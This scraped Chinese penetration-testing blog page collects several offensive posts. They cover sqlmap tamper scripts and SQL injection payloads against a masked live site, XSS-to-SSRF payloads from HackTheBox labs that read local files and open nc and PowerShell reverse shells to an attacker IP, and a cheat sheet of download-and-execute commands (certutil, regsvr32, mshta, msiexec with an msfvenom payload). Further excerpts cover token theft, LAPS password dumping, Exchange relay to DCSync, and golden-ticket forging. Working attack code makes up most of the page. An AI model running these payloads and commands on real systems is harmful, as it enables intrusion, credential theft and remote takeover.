from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW
def dependencies():
pass
def tamper(payload, **kwargs):
return payload.replace(&quot;FROM&quot;,&quot;/*!44144FROM*/&quot;)验证：
python sqlmap.py -u &quot;https://www.xxxx.com/journals_desc.php?id=66&quot; --level 3 --risk 3 -v 3 --tamper=&quot;from,concat2concatcomment&quot; --force-ssl  --technique=E
--dbs读取（可以比对一下使用tamper脚本和使用tamper脚本后语句）payload in sqlmap:
1AND (SELECT 8403 &#x2F;*!44144FROM*&#x2F;(SELECT COUNT(*),CONCAT&#x2F;**&#x2F;(0x716b707071,(SELECT REPEAT(0x34,1024)),0x71627a7a71,FLOOR(RAND(0)*2))x &#x2F;*!44144FROM*&#x2F; INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

--tables读取，很遗憾，读取失败

再次把它的payload拿到本地测试，也是行不通的。语句很长，需要慢慢fuzz究竟是哪里被拦截、组合、函数、关键字？
但是，，，，坑的是竟然不是因为过滤引起的？？？？
#四、修改SQLmap的xml文件语句实在不行了，去用手工注了出来，但是用SQLmap就是跑不出来？？？再去看一下SQLmap的payload是不是有问题，咋一看没什么大问题，所以我一开始也忽略了，卡了好久。也就是这里涉及到了直接修改SQLmap自带的语句。大家自行比较一下下面这两条语句看看能不能看出问题~1、
https://www.xxxx.com/journals_desc.php?id=40%20and%20updatexml/**/(1,concat/**//**/(0x7e,(select%20DISTINCT%20GROUP_CONCAT(table_name)/*!44144from*/%20%20%20information_schema.TABLES%20where%20table_schema=database())%20),1)2、
https://www.xxxx.com/journals_desc.php?id=40%20and%20updatexml/**/(1,concat/**//**/(0x7e,(select%20DISTINCT%20GROUP_CONCAT(table_name)/*!44144from*/%20%20%20information_schema.`TABLES`%20where%20table_schema=database())%20),1)下面讲几个概念
[1]table和colums在mysql中是特殊字符
[2]反引号是sql语言的转义字符
[3]在mysql中的sql语句为了避免与系统冲突给表名加上反引号  ，（但在指定其他数据库时不能加，否则会被认作是表）
我们可以看到这里sqlmap的payload,对于information_schema.tables中的tables并没有加反引号,指引到/xml/queries.xml
information_schema.tables --&gt; information_schema.`tables`当然，columns也需要修改
information_schema.columns --&gt; information_schema.`columns`修改之后跑表：
python sqlmap.py -u &quot;https://www.xxxx.com/journals_desc.php?id=66&quot; --level 3 --risk 3 -v 3 --tamper=&quot;from,concat2concatcomment&quot;   --technique=E   -D mililink_main --tablespayload in sqlamp（比对一下payload，看看效果）:
66 AND (SELECT 9571 /*!44144FROM*/(SELECT COUNT(*),CONCAT/**/(0x716b7a6b71,(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) /*!44144FROM*/ INFORMATION_SCHEMA.`TABLES` WHERE table_schema IN (0x6d696c696c696e6b5f6d61696e) LIMIT 15,1),0x7171767071,FLOOR(RAND(0)*2))x /*!44144FROM*/ INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
跑列值也是一样的，就不多说了，直接上图

#五、关于SQLmap自定义payload的一些思考SQLmap的payload修改，其实并不复杂。
tamper脚本的编写，可以参考上边的from.py和concat2concatcomment.py，它其实是有固定格式的。简单的自定义paylaod只需要在def tamper(payload, **kwargs)函数中写入替换语句即可。可参考https://payloads.online/archivers/2017-06-08/1
修改/添加sqlmap的xml文件语句来自定义payload。需要找到对应的xml文件，然后修改xml文件中的语句。    查询语句在\sqlmap\data\xml\ queries.xml定义，若想自定义查询语句则只需要修改/添加想要执行的查询语句即可，如上边对INFORMATION_SCHEMA.TABLES的修改不同的注入方式使用的语句则需要在对应的注入方式中的xml语句进行修改，在\sqlmap\data\xml\payloads\文件下

假若我们需要修改error-base注入方式的payload，则需要在/xml/payload/error_based.xml中修改


</section>
    <p class="sub">Apr 19, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/" class="title">从两道靶场题目看XHR</a>
    <section class="desc">
  首发于先知社区：https://xz.aliyun.com/t/7473/
#0x01、什么是XHRXHR，也就是XMLHttpRequest，是现代浏览器都有的一个内置对象，使用 XMLHttpRequest对象可以与服务器交互。无需刷新整个页面即可从URL获取数据，允许网页在不影响用户的操作的情况下更新页面的局部内容，多应用于 AJAX 编程中。
特别注意的是XMLHttpRequest 可以用于获取任何类型的数据，而不仅仅是XML，它甚至支持 HTTP 以外的协议（包括 file:// 和 FTP）
#0x02、利用一：读取本地文件
适用于XSS打到后台管理员，以普通用户身份构造payload发送给管理员，登录后台触发payload并查看回显（也就是拿到cookie能够登录后台的情况）
以Hackthebox的book靶场为例：
情景描述：普通用户能够上传pdf文件，且能够自定义Title和Author，管理员能够下载用户上传的pdf；登录管理员发现Title字段插入的xss解析并显示在管理员能够看到的pdf标题中

验证：Title字段插入内容更改为
1&lt;script&gt;document.write(Date());&lt;/script&gt;

进一步利用：利用XHR读取本地文件
本来直接想到的是在浏览器本地同源的情况下file协议读取：&lt;利用iframe的file协议&gt;
&lt;iframe src=&quot;file:///etc/passwd&quot;&gt;&lt;/iframe&gt;
没有回显
&lt;script&gt;document.write(&apos;&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;&apos;)&lt;/script&gt;还是没有回显
姿势不够，直接使用iframe插入paylaod没有回显，但是说明了可以使用file协议，尝试使用XHR发送Ajax请求并利用File协议读取：
&lt;script&gt;
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);
x.send();
 &lt;/script&gt;Tips：由于这里对Title内容没有字数限制，所以我直接插入完整paylaod，有字数限制的情况下可以写入js文件中，后面会讲到

同样的方法可以直接读取到该服务器的用户ssh私钥进行登录
#0x03、利用二：由XSS到SSRF之命令执行
这个条件比较苛刻，需要有命令执行，但是对执行者的IP进行验证，这里以HackTheBox的Bankrobber中的例子为例
情景描述：页面端有个backdoorchecker.php页面，能够执行dir命令(限制不严，很简单就绕过)，但是只允许本地执行，直接看代码（通过SQL注入已读取到源码）

简易思路:现有XSS，尝试结合XMLHttpRequest借用本地账户进行操作：借用管理员身份打开backerdoorchecker.php绕过IP限制（即转换成SSRF），并构造payload绕过命令执行限制
漏洞利用：借助smb执行我们攻击机上的nc反弹shell （smb服务可以借助impacket套件中的smbserver.py快速搭建）Payload：
&lt;script&gt; var x = new XMLHttpRequest(); x.open(&quot;POST&quot;, &quot;backdoorchecker.php&quot;, true); x.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;); x.send(&apos;cmd=dir xxx || \\\\10.10.16.21\\ica\\nc.exe -e cmd.exe 10.10.16.21 9999&apos;);&lt;/script&gt;nc -lvvp 9999 即可回弹shell
#0x04、一点小小扩展这里可以把payload写到js文件中，然后插入我们的js文件即可，关于如何编写XHR的js文件的链接会放到文末。这里针对利用二，还有另外的利用方式，即通过powershell IEX下载脚本并反弹PowerShellTcp.ps1并反弹。既然提到了js文件的方式，就以这种方式构造payload：XSS框直接插入：    
Reverse.js文件内容如下：
function paintfunc(){
 var http = new XMLHttpRequest();
     var url = &apos;http://localhost/admin/backdoorchecker.php&apos;;
     var params = &apos;cmd=dir| powershell -c &quot;iex (New-Object Net.WebClient).DownloadString(\&apos;http://10.10.16.21:8000/Invoke-PowerShellTcp.ps1\&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.21 -Port 9969&quot;&apos;;
     http.open(&apos;POST&apos;, url, true);
     http.setRequestHeader(&apos;Content-type&apos;, &apos;application/x-www-form-urlencoded&apos;);
     http.send(params);
}
paintfunc();#0x05、题后话1）、关于XSS结合XHR还有更多利用，如不能登录后台的情况下添加管理员等
2）、关于iframe没有回显的问题：这是由于iframe是通过浏览器本地同源来进行加载文件的，即不能通过网络加载，我们简单做个测试：创建iframe.html,写入如下语句
&lt;iframe src=&quot;file:///F:/password.txt&quot;&gt;&lt;/iframe&gt;直接在本地直接打开

放到网站目录下通过浏览器访问：

链接：
https://www.w3schools.com/xml/xml_http.asp 
http://heartsky.info/2017/08/30/%E6%B5%85%E8%B0%88-XSS-%E5%8F%91%E9%80%81%E5%A4%96%E5%9F%9F%E8%AF%B7%E6%B1%82/
https://blog.0daylabs.com/2014/11/01/xss-ex-filtrating-data-xmlhttprequest-js-pentesters-task-15-write/


</section>
    <p class="sub">Apr 19, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/19/multi-ways-file-download/" class="title">multi-ways-file-download</a>
    <section class="desc">
  这里我分为三个模块：Linux、Windows、常见语言环境
#Linux#
1、curlcurl -O http://xx.xx.xx.xx/filename 
curl http://xx.xx.xx.xx/filename  -o path/filename2、wgetwget http://xx.xx.xx.xx/filename  [-o path/filename]3、nc3.1、发送方主动连接目标机器接收方先执行命令
发送方：
nc -w 3 [destination] 1234 &lt; out.file
接收方:
nc -l -p 1234 &gt; out.file3.2、目标机器主动连接发送方cat file | nc -l 1234   ###发送方将文件内容打印到本地1234端口，接收方访问1234端口接收文件
nc  launcher_ip 1234 &gt; file  ####接收方4、利用linux自带base64命令本地将(可执行)文件转换为base64
python -c &apos;print(__import__(&quot;base64&quot;).b64encode(open(&quot;file&quot;, &quot;rb&quot;).read()))&apos;目标机器执行：
echo &quot;strings&quot; | base64 -d &gt; out.file5、SCPscp username@servername:/path/filename /tmp/local_destination当然，windows有ssh的也可以使用，只是Linux一般比较多
Windows1、Powershell1.1、IEX调用WebClient[1]
IEX(New-Object System.Net.WebClient).DownloadFile($url, $output)   ####下载[2]    
powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.10.14.67:8000/PowerUp.ps1&apos;); Invoke-AllChecks&quot; ##加载PS1到内存并执行1.2、WebRequest下载：Invoke-WebRequest  （-Uri） http://10.10.14.67:8000/procdump.exe -outfile ./procdump.exe  ###cmd下前面加powershell1.3、BitsTransferStart-BitsTransfer -Source $url -Destination $output  ###cmd下前面加powershell2、SMB2.1、powershellCopy-Item -Source \\10.10.101.222\share\xxx.exe -Destination C:\path\2.2、CMDcopy \\10.10.101.222\share\xxx.exe或者
Robocopy : https://www.microsoft.com/en-us/download/details.aspx?id=176573、CURL高版本windows自带
curl -O  http://10.10.101.222:8000/xxx.exe
culr  http://10.10.101.222:8000/xxx.exe -o C:/tmp/xxx.exe 4、FTPecho open 10.10.101.222 21&gt; ftp.txt
echo ftp&gt;&gt; ftp.txt
echo bin &gt;&gt; ftp.txt
echo ftp&gt;&gt; ftp.txt
echo GET xxx.exe &gt;&gt; ftp.txt
ftp -s:ftp.txt或交互式shell情况下直接ftp登录到攻击机(开启ftp) get filename（linux开启ftp同样适用）
5、VBS5.1、.vbs文件内容Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;)
Set Shell = CreateObject(&quot;Wscript.Shell&quot;)
Post.Open &quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,0
Post.Send()
Set aGet = CreateObject(&quot;ADODB.Stream&quot;)
aGet.Mode = 3
aGet.Type = 1
aGet.Open()
aGet.Write(Post.responseBody)
aGet.SaveToFile &quot;C:\test\update\xxx.exe&quot;,25.2、CMD下执行echo Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;) &gt;&gt;download.vbs
echo Set Shell = CreateObject(&quot;Wscript.Shell&quot;) &gt;&gt;download.vbs
echo Post.Open &quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,0 &gt;&gt;download.vbs
echo Post.Send() &gt;&gt;download.vbs
echo Set aGet = CreateObject(&quot;ADODB.Stream&quot;) &gt;&gt;download.vbs
echo aGet.Mode = 3 &gt;&gt;download.vbs
echo aGet.Type = 1 &gt;&gt;download.vbs
echo aGet.Open() &gt;&gt;download.vbs
echo aGet.Write(Post.responseBody) &gt;&gt;download.vbs
echo aGet.SaveToFile &quot;C:\tmp\xxx.exe&quot;,2 &gt;&gt;download.vbs5.3、wget.vbson error resume next
iLocal=LCase(Wscript.Arguments(1))
iRemote=LCase(Wscript.Arguments(0))
iUser=LCase(Wscript.Arguments(2))
iPass=LCase(Wscript.Arguments(3))
set xPost=CreateObject(&quot;Microsoft.XMLHTTP&quot;)
if iUser=&quot;&quot; and iPass=&quot;&quot; then
xPost.Open &quot;GET&quot;,iRemote,0
else
xPost.Open &quot;GET&quot;,iRemote,0,iUser,iPass
end if
xPost.Send()
set sGet=CreateObject(&quot;ADODB.Stream&quot;)
sGet.Mode=3
sGet.Type=1
sGet.Open()
sGet.Write xPost.ResponseBody
sGet.SaveToFile iLocal,2cscript wget.vbs http://10.10.101.222:8000/xxx.exe
6、CSC.exeCSC.exe是windows自带的C#编译器CSC.exe路径需要绝对路径，且路径根据.net版本而定download.cs：（利用echo依次写入如下内容）
using System.Net;
namespace downloader
{
    class Program
    {
    static void Main(string[] args)
    {
        WebClient client = new WebClient();
        string URLAddress = @&quot;http://10.10.101.222:8000/xxx.exe&quot;;
        string receivePath = @&quot;C:\tmp\&quot;;
        client.DownloadFile(URLAddress, receivePath + System.IO.Path.GetFileName
(URLAddress));
    }
 }
}执行：C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:C:\tmp\download.exe C:\tmp\download.cs
7、记事本文件下载notepad中:打开–&gt;输入URL （win10 不支持？？？）
8、JScript下载.js文件内容
var Object = WScript.CreateObject(&quot;MSXML2.XMLHTTP&quot;);
Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);
Object.send();
if (Object.Status == 200)
{
   var Stream = WScript.CreateObject(&quot;ADODB.Stream&quot;);
   Stream.Open();
   Stream.Type = 1;
   Stream.Write(Object.ResponseBody);
   Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;, 2);
Stream.Close();
}执行： node download.js或合并成一句话形式：也就是rundll32
rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();Object=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);Object.send();if(Object.Status==200){Stream=new ActiveXObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;,2);Stream.Close();}9、bitsadmin不支持https,ftp协议，使用SimpleHttpServer会报错
bitsadmin /transfer n http://10.10.101.222:8000\xxx.exe  C:\tmp\xxx.exe10、Certutilcertutil.exe -urlcache -split -f http://10.10.101.222:8000/xxx.exe xxx.exe  ###下载文件
certutil -urlcache -split -f http://10.10.101.222:8000/xxx.exe delete   ###删除缓存11、msiexec  （远程执行）https://www.hackingarticles.in/bypass-application-whitelisting-using-msiexec-exe-multiple-methods/
msfvenom -p windows/exec CMD=cmd.exe -f msi &gt; evil.msi
msiexec /q /i http://10.10.101.222:8000/evil.msi12、IEExecC:\Windows\Microsoft.NET\Framework\v2.0.50727&gt; caspol -s off   ####需管理员身份
C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt; IEExec http://10.10.101.222:8000/xxx.exe13、mshtamshta http://10.10.101.222/run.htarun.hta
&lt;HTML&gt; 
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; 
&lt;HEAD&gt; 
&lt;script language=&quot;VBScript&quot;&gt; Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject(&quot;Wscript.Shell&quot;) objShell.Run &quot;cmd.exe /c net user&quot; // 这里填写命令 
self.close &lt;/script&gt; 
    &lt;body&gt; demo &lt;/body&gt; 
&lt;/HEAD&gt;
&lt;/HTML&gt;14、rundll32rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();Object=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);Object.send();if(Object.Status==200){Stream=new ActiveXObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;,2);Stream.Close();}15、regsvr32：https://www.hackingarticles.in/bypass-application-whitelisting-using-regsrv32-exe-multiple-methods/
regsvr32 /u /s /i:http://10.10.101.222:8000/run.sct scrobj.dllrun.sct:
&lt;?XML version=&quot;1.0&quot;?&gt; 
&lt;scriptlet&gt; 
&lt;registration     
    progid=&quot;ShortJSRAT&quot;     
    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;     
    &lt;!-- Learn from Casey Smith @subTee --&gt;     
    &lt;script language=&quot;JScript&quot;&gt;         
        &lt;![CDATA[             
            ps  = &quot;cmd.exe /c calc.exe&quot;;   ####命令执行          
            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);         
            ]]&gt; 
&lt;/script&gt; 
&lt;/registration&gt;
&lt;/scriptlet&gt;常见编程环境下载Python1、命令行版本python -c &quot;import urllib2;u=urllib2.urlopen(&quot;http://xx.xxx.xx/filename&quot;);localfile=open(&apos;c:\tmp\filename&apos;,&apos;w&apos;);localfile.write(u.read());localfile.close();&quot;2、脚本执行版本#!python
#!/usr/bin/python
import urllib2
u = urllib2.urlopen(&apos;http://domain/file&apos;)
localFile = open(&apos;local_file&apos;, &apos;w&apos;)    
localFile.write(u.read())
localFile.close()kali@kali:~# python test.py
3、通过python脚本构造任意文件上传页面： https://0day.work/finding-an-arbitrary-file-upload-vulnerability-in-a-filesharing-script/
Perl1、命令行版本perl -MLWP::Simple -e &apos;getstore (&quot;http://xx.xx.xx.xx/filename&quot;,&quot;filename&quot;)&apos;2、脚本执行
#!/usr/bin/perl
use LWP::Simple;
getstore(&quot;http://domain/file&quot;, &quot;file&quot;);kali@kali:~# perl test.pl
Ruby#!ruby
#!/usr/bin/ruby
require &apos;net/http&apos;
Net::HTTP.start(&quot;www.domain.com&quot;) { |http|
r = http.get(&quot;/file&quot;)
open(&quot;save_location&quot;, &quot;wb&quot;) { |file|
file.write(r.body)
}
}kali@kali:~# ruby test.rb
PHP1、命令行
php -r &apos;$data = @file(&quot;http://10.10.14.67:8000/winPEAS.exe&quot;);$f = fopen(&quot;/tmp/winPEAS.exe&quot;, &quot;w&quot;);fwrite($f, $data[0]);fclose($f);&apos;2、脚本执行
&lt;?php 
$data = @file(&quot;http://10.10.14.67:8000/winPEAS.exe&quot;);
$f = fopen(&quot;/tmp/winPEAS.exe&quot;, &quot;w&quot;);
fwrite($f, $data[0]);
fclose($f);?&gt;kali@kali:~# php test.php


</section>
    <p class="sub">Apr 19, 2020</p>
  </div>
</div>-->
<!---->
<!--
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/">&lt;span class&#x3D;&quot;iconfont icon-arrow-left&quot;&gt;&lt;&#x2F;span&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">&lt;span class&#x3D;&quot;iconfont icon-arrow-right&quot;&gt;&lt;&#x2F;span&gt;</a>
  </nav>

-->

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.0.2/css/swiper.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.0.2/js/swiper.min.js"></script>
<div class="main-right flex1 flex flex-v">
    <div class="box-content flex1">
        <div class="swiper-container">
            <div class="swiper-wrapper">
                
                    <a title="incognito Stealing Windows Access Tokens" alt="incognito Stealing Windows Access Tokens" href="/2020/04/26/incognito-Stealing-Windows-Access-Tokens/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="incognito Stealing Windows Access Tokens" alt="incognito Stealing Windows Access Tokens"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; incognito Stealing Windows Access Tokens &gt;</div>
                            <div class="content flex1">
                                
  使用incognito可以窃取令牌以任意用户身份执行任意命令或payload
得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌列出域管理组成员：
net groups &quot;Domain Admins&quot; /domain0x01、ACCESS TOKEN(访问令牌)：
当用户登录时，Windows会为此用户创建访问令牌，用于存储用户的身份和特权
Token在用户创建进程或者线程时会被使用，那么这些进程或者线程能够访问哪些资源取决于当前令牌
0x02、令牌类型
Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)
Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)
这两种令牌,都会在系统重启以后被清除, 否则将会一直驻留在内存中,而授权令牌则会在用户注销以后自动被转为模拟令牌,但仍然可利用。
0x03、本地和远程的基本用法
本地： 
查看 token：
incognito.exe list_tokens–u 
获取到已注销用户 int18\administrator的token,盗取token 执行命令： 
incognito.exe execute -c &quot;int18\administrator&quot; calc.exe 远程：
incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  list_tokens -u
incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe 
0x04、提权、降权、伪造（以本地示例)
incognito execute -c &quot;NT AUTHORITYSYSTEM&quot; cmd.exe #提权至system 
incognito execute -c &quot;int\test&quot; cmd.exe #降权至当前 test 用户 
incognito execute -c &quot;int\test1&quot; cmd.exe #伪造test1 用户 0x03、获取TrustedInstaller 权限（修改系统文件）管理员、System 均无法修改系统文件、需 TrustedInstaller 权限借用 TrustedInstaller.exe 的 token 创建子进程，这样子进程就有了 TrustedInstaller 权限
在CS下获取TrustedInstaller 

shell sc strat TrustedInstaller 


steal token  1700 ##ps查看TrustedInstaller进程号


shell whoami /groups

链接：
https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/
https://blog.csdn.net/qq_36374896/article/details/84261516  
https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html 
https://www.jianshu.com/p/907c6aab6fd0
http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="域渗透之AD Recyle Bin组利用+Ldaps信息枚举" alt="域渗透之AD Recyle Bin组利用+Ldaps信息枚举" href="/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="域渗透之AD Recyle Bin组利用+Ldaps信息枚举" alt="域渗透之AD Recyle Bin组利用+Ldaps信息枚举"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 域渗透之AD Recyle Bin组利用+Ldaps信息枚举 &gt;</div>
                            <div class="content flex1">
                                
  AD Recyle Bin组利用：使用回收站还原用户，或获取用户旧密码进行碰撞
前提,需要域内启用回收站功能，且用户在AD Recyle Bin 组中
未启用启用回收站和启用回收站删除对象对比
图1：启用回收站之前已删除的Active Directory对象的生命周期

图2：启用回收站后已删除的Active Directory对象的生命周期

启用AD回收站：
Enable-ADOptionalFeature –Identity ‘CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=www,DC=domain,DC=com’ –Scope ForestOrConfigurationSet –Target ‘www.domain.com’查看删除用户
Get-ADObject -filter &apos;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&apos; -includeDeletedObjects结果示例：
Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059尝试还原已删除账户
Restore-ADObject -Identity &apos;f0cc344d-31e0-4866-bceb-a842791ca059&apos;###使用ObjectGUID进行还原或
Get-ADObject -Filter {displayName -eq  &quot;TempAdmin&quot;} IncludeDeletedObjects | Restore-ADObject查询ms-mcs-admpwd
Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN=*)&quot; –IncludeDeletedObjects -Property ms-mcs-admpwd  查看有关于特定账户的全部属性信息：
Get-ADObject -Filter {displayName -eq &quot;TempAdmin&quot;} -IncludeDeletedObjects -Properties *  
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz如这里存在LegacyPassword（直接缓存的旧密码）名称被自定义，通过查看所有属性列出来
Ldap枚举：获取基本的账户信息、密码ldapsearch 使用：列出基本的上下文信息
kali@kali:$ ldapsearch -h 10.10.10.182 -D  cascade.local -x -s base namingcontexts提取整个域目录的数据，然后grep筛选输出：
kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -s sub -b &quot;DC=cascade,DC=local&quot; |tee ldap.out
root@kali:$ cat ldap.out |grep -i memberof筛选输出：
kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascade,DC=local&quot; &apos;(objectClass=User)&apos; sAMAccountName sAMAccountType列出管理用户组
kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascae,DC=local&quot; &apos;(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local)&apos; |grep -i memberofDump LAPS passwords:
kali@kali:$ ldapsearch -h  -D cascade.local -x -b &quot;dc=cascade,dc=local&quot; &apos;(ms-MCS-AdmPwd=*)&apos; ms-MCS-AdmPwd同样windapsearch也是一个不错的工具
kali@kali:$./windapsearch_py2.py  --dc-ip 10.10.10.182 -d cascade.local --full --users

...
user:r.thompson
cascadeLegacyPwd: clk0bjVldmE=
...https://github.com/snovvcrash/cheatsheets/tree/master 
https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html 



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="域控提权之Exchange提权" alt="域控提权之Exchange提权" href="/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="域控提权之Exchange提权" alt="域控提权之Exchange提权"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 域控提权之Exchange提权 &gt;</div>
                            <div class="content flex1">
                                
  原理 ：Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync
也就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限
漏洞利用：net group 查看用户组

或者当前用户不在Exchange Permissions组中，但在Account Operator中（该组的成员能操作用户管理员所属域的账号和组，并可设置其权限。但是该组成员无法修改Administrators及Operators组及权限），可以添加一个用户并加入到Exchange Permissions组
添加用户tw：
$pass = ConvertTo-SecureString &quot;password&quot; -AsPlainText -Force
New-ADUser tw -AccountPassword $pass -Enabled $True将用户添加到Exchange Permissions组
net group &quot;Exchange Windows Permissions&quot; tw /add 
或
Import-Module ActiveDirectory
Add-ADGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members  tw检查是否已成功添加
net group &quot;Exchange Windows Permissions&quot; /domain 使用ntlmrelayx.py进行ntlm中继：
sudo python ntlmrelayx.py -t  ldap://10.10.10.161 --escalate-user tw运行该中继命令之后，可通过浏览器访问本地127.0.0.1进行连接（输入tw账户密码），也可使用prieexchange.py进行连接
python privexchange.py  -ah 10.10.16.21  10.10.10.161   -u tw-p password -d htb.local（10.10.16.21为我kali ip）

连接成功之后，使用secretdump.py导出域控hash #######时间蛮久的，需要出现上图提示
impacket-secretsdump htb.local/tw:password@10.10.10.161 -just-dc
进一步学习：在Linux上使用KRBTGT hash实现金票攻击
在上面的实验中，同样还获得了KRBTGT hash，下面学习学习如何在Linux上使用它
首先获取domain sid ：
Get-ADDomain htb.local
S-1-5-21-3072663084-364016917-1341370565使用NTLM生成TGT###TGT也可以使用AES-KEY生成
python ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid  S-1-5-21-3072663084-364016917-1341370565 -domain HTB.LOCAL UserDoesnotExit运行之后生成一个UserDoesnotExit.ccache缓存文件使用ccache设置ticket
export KRB5CCNAME=UserDoesnotExit.ccache
使用TGT使用下列任意方式远程执行命令
python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
